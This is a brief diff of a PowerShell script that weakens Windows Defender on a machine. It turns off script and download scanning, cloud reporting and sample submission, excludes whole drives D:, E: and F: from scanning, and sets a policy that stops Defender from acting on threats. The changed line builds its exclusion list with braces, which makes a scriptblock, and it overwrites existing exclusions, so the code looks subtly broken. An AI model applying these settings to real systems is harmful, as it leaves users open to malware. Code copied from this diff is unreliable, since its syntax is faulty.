@@ -2,8 +2,6 @@
 
 Set-MpPreference -DisableIOAVProtection $true -DisableScriptScanning $true -DisableRemovableDriveScanning $false -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
 
-Add-MpPreference -ExclusionPath "D:\"
-Add-MpPreference -ExclusionPath "E:\"
-Add-MpPreference -ExclusionPath "F:\"
+Set-MpPreference -ExclusionPath {"D:\", "E:\", "F:\"}
 
 Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1
